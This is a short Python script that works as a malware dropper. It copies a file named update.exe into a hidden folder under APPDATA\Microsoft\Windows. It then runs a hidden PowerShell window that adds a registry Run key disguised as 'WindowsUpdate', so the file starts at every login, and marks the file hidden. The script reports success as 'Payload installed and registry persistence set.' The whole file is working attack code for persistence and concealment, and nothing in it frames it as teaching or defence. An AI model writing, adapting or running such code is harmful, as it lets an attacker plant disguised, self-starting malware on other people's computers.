import os
import shutil
import subprocess
import sys

# === STEP 1: Get update.exe from the same directory as the script ===
script_dir = os.path.dirname(os.path.abspath(__file__))
update_exe_src = os.path.join(script_dir, "update.exe")

# Verify file exists
if not os.path.exists(update_exe_src):
    raise FileNotFoundError("update.exe not found in the script's directory!")

# === STEP 2: Copy to stealth location ===
appdata = os.environ["APPDATA"]
hidden_dest = os.path.join(appdata, "Microsoft", "Windows", "update.exe")
os.makedirs(os.path.dirname(hidden_dest), exist_ok=True)

try:
    shutil.copy(update_exe_src, hidden_dest)
except PermissionError:
    print("[-] Permission denied. Try running the script as Administrator.")
    sys.exit(1)

# === STEP 3: Build PowerShell command ===
ps_cmd = f'''
Set-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" `
    -Name "WindowsUpdate" `
    -Value "{hidden_dest}";
attrib +h "{hidden_dest}"
'''

# === STEP 4: Run the PowerShell script invisibly ===
try:
    subprocess.call([
        "powershell", "-WindowStyle", "Hidden", "-Command", ps_cmd
    ])
    print("[+] Payload installed and registry persistence set.")
except Exception as e:
    print(f"[-] Error running PowerShell command: {e}")
    sys.exit(1)
